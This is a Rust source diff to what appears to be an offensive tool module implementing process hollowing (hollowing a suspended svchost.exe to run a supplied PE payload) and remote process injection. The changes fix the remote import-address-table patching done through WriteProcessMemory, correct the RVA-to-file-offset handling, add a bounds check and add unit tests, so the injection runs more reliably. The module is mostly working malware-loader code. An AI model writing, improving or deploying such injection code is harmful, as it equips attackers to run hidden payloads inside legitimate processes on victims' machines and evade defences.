@@ -2,6 +2,31 @@ use anyhow::{anyhow, Result};
 #[cfg(windows)]
 use winapi::ctypes::c_void;
 
+/// Section descriptor for `rva_to_file_offset_sections` — platform-agnostic
+/// so the conversion logic can be unit-tested without `#[cfg(windows)]`.
+#[cfg(any(windows, test))]
+#[derive(Clone, Copy)]
+struct SectionDesc {
+    virtual_address: usize,
+    virtual_size: usize,
+    raw_offset: usize,
+}
+
+/// Walk a slice of `SectionDesc` entries and convert `rva` to a raw file offset.
+///
+/// Returns `rva` unchanged when no section contains it (header area, which maps
+/// 1:1 for PE files with `SizeOfHeaders` bytes of header data).
+#[cfg(any(windows, test))]
+fn rva_to_file_offset_sections(rva: usize, sections: &[SectionDesc]) -> usize {
+    for sec in sections {
+        if rva >= sec.virtual_address && rva < sec.virtual_address + sec.virtual_size {
+            return rva - sec.virtual_address + sec.raw_offset;
+        }
+    }
+    // Fallback: header area (rva < SizeOfHeaders) maps 1:1.
+    rva
+}
+
 /// Convert a Relative Virtual Address (RVA) from the PE optional-header data
 /// directories to a raw file offset by walking the section table.
 ///
@@ -11,24 +36,30 @@ use winapi::ctypes::c_void;
 /// as a file offset is only accidentally correct for packed/aligned images
 /// where `VirtualAddress == PointerToRawData`.  For general PE files the two
 /// values differ and we must walk the section headers.
+///
+/// # Safety
+///
+/// `nt` must point to a valid, fully-mapped `IMAGE_NT_HEADERS64` structure.
+/// The section headers immediately following it must also be valid and in-bounds.
 #[cfg(windows)]
 unsafe fn rva_to_file_offset(
     rva: usize,
     nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
 ) -> usize {
     let num_sections = (*nt).FileHeader.NumberOfSections as usize;
-    let sections = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>())
+    let first = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>())
         as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
-    for i in 0..num_sections {
-        let sec = &*sections.add(i);
-        let va = sec.VirtualAddress as usize;
-        let vs = *sec.Misc.VirtualSize() as usize;
-        if rva >= va && rva < va + vs {
-            return rva - va + sec.PointerToRawData as usize;
-        }
-    }
-    // Fallback: header area (rva < SizeOfHeaders) maps 1:1.
-    rva
+    let descs: Vec<SectionDesc> = (0..num_sections)
+        .map(|i| {
+            let sec = &*first.add(i);
+            SectionDesc {
+                virtual_address: sec.VirtualAddress as usize,
+                virtual_size: *sec.Misc.VirtualSize() as usize,
+                raw_offset: sec.PointerToRawData as usize,
+            }
+        })
+        .collect();
+    rva_to_file_offset_sections(rva, &descs)
 }
 
 /// Hollow a new suspended svchost.exe process and execute the provided PE payload inside it.
@@ -460,6 +491,14 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             let nt =
                 (payload.as_ptr() as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
 
+            let nt_off = (*dos).e_lfanew as usize;
+            if nt_off.saturating_add(std::mem::size_of::<IMAGE_NT_HEADERS64>()) > payload.len() {
+                close_h!(hprocess);
+                return Err(anyhow!(
+                    "inject_into_process: e_lfanew ({nt_off:#x}) out of bounds for payload of {} bytes",
+                    payload.len()
+                ));
+            }
             if (*nt).Signature != IMAGE_NT_SIGNATURE {
                 close_h!(hprocess);
                 return Err(anyhow!("inject_into_process: invalid NT signature"));
@@ -825,15 +864,14 @@ unsafe fn fix_iat_remote(
             continue;
         }
 
-        let thunk_rva = if orig_first_thunk_rva != 0 {
-            orig_first_thunk_rva
-        } else {
-            first_thunk_rva
-        };
         let mut thunk_off = thunk_rva_off; // file offset into INT (import name table)
-        let mut iat_off = first_thunk_off; // file offset into IAT (import address table)
-        let thunk_rva_base = thunk_rva; // needed to keep running RVA for IMAGE_IMPORT_BY_NAME
-        let _ = thunk_rva_base;
+        // Track the IAT position as an RVA, not a file offset.  The remote process
+        // maps PE sections at their virtual addresses (RVAs relative to image base),
+        // so writes to the remote IAT must target `remote_base + IAT_RVA`, NOT
+        // `remote_base + file_offset`.  The two values differ whenever the .idata
+        // section has `PointerToRawData != VirtualAddress` (the common case for any
+        // PE with a non-trivial section layout).
+        let mut iat_rva = first_thunk_rva; // RVA for remote IAT write targets
         loop {
             if thunk_off + 8 > payload.len() {
                 break;
@@ -855,7 +893,7 @@ unsafe fn fix_iat_remote(
                 let ibn_off = rva_to_file_offset(ibn_rva, nt);
                 if ibn_off + 2 >= payload.len() {
                     thunk_off += 8;
-                    iat_off += 8;
+                    iat_rva += 8;
                     continue;
                 }
                 let name_start = ibn_off + 2; // skip 2-byte Hint
@@ -874,7 +912,9 @@ unsafe fn fix_iat_remote(
             };
 
             if func_addr != 0 {
-                let iat_remote = (remote_base + iat_off) as *mut c_void;
+                // Write the resolved address into the remote IAT entry.  Use the
+                // RVA (not the file offset) to compute the remote target address.
+                let iat_remote = (remote_base + iat_rva) as *mut c_void;
                 WriteProcessMemory(
                     hprocess,
                     iat_remote,
@@ -884,7 +924,7 @@ unsafe fn fix_iat_remote(
                 );
             }
             thunk_off += 8;
-            iat_off += 8;
+            iat_rva += 8;
         }
         desc_off += 20;
     }
@@ -936,4 +976,77 @@ pub fn hollow_and_execute(_payload: &[u8]) -> Result<()> {
 #[cfg(not(windows))]
 pub fn inject_into_process(_pid: u32, _payload: &[u8]) -> Result<()> {
     Err(anyhow!("inject_into_process is only available on Windows"))
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+// Unit tests
+// ──────────────────────────────────────────────────────────────────────────────
+
+#[cfg(test)]
+mod tests {
+    use super::{rva_to_file_offset_sections, SectionDesc};
+
+    /// Build a synthetic section table where raw offsets and virtual addresses
+    /// deliberately differ so a naive RVA-as-file-offset would be wrong.
+    ///
+    /// Layout:
+    ///  .text  VA=0x1000  VS=0x200  raw=0x400   (raw ≠ VA)
+    ///  .data  VA=0x2000  VS=0x100  raw=0x600   (raw ≠ VA)
+    ///  .idata VA=0x3000  VS=0x080  raw=0x700   (IAT section)
+    fn synthetic_sections() -> Vec<SectionDesc> {
+        vec![
+            SectionDesc { virtual_address: 0x1000, virtual_size: 0x200, raw_offset: 0x400 },
+            SectionDesc { virtual_address: 0x2000, virtual_size: 0x100, raw_offset: 0x600 },
+            SectionDesc { virtual_address: 0x3000, virtual_size: 0x080, raw_offset: 0x700 },
+        ]
+    }
+
+    #[test]
+    fn rva_in_text_section_maps_to_correct_raw_offset() {
+        let secs = synthetic_sections();
+        // RVA 0x1050 is 0x50 bytes into .text (VA=0x1000, raw=0x400).
+        // Expected file offset: 0x400 + 0x50 = 0x450.
+        assert_eq!(rva_to_file_offset_sections(0x1050, &secs), 0x450);
+    }
+
+    #[test]
+    fn rva_in_idata_section_maps_to_iat_raw_offset() {
+        let secs = synthetic_sections();
+        // RVA 0x3010 is 0x10 bytes into .idata (VA=0x3000, raw=0x700).
+        // Expected: 0x700 + 0x10 = 0x710.
+        // A naive RVA-as-file-offset would give 0x3010 — wrong.
+        assert_eq!(rva_to_file_offset_sections(0x3010, &secs), 0x710);
+    }
+
+    #[test]
+    fn rva_in_header_area_falls_back_to_identity() {
+        let secs = synthetic_sections();
+        // RVA below first section VA is in the PE header; maps 1:1.
+        assert_eq!(rva_to_file_offset_sections(0x100, &secs), 0x100);
+    }
+
+    #[test]
+    fn rva_exactly_at_section_start() {
+        let secs = synthetic_sections();
+        // RVA 0x2000 is exactly the start of .data (raw=0x600).
+        assert_eq!(rva_to_file_offset_sections(0x2000, &secs), 0x600);
+    }
+
+    #[test]
+    fn rva_one_past_section_end_falls_back() {
+        let secs = synthetic_sections();
+        // RVA 0x2100 is exactly one byte past .data (VA=0x2000, VS=0x100),
+        // so it should fall through to the identity fallback.
+        assert_eq!(rva_to_file_offset_sections(0x2100, &secs), 0x2100);
+    }
+
+    #[test]
+    fn non_windows_hollow_and_execute_returns_error() {
+        #[cfg(not(windows))]
+        {
+            let result = super::hollow_and_execute(&[0x4d, 0x5a]);
+            assert!(result.is_err());
+            assert!(result.unwrap_err().to_string().contains("Windows"));
+        }
+    }
 }
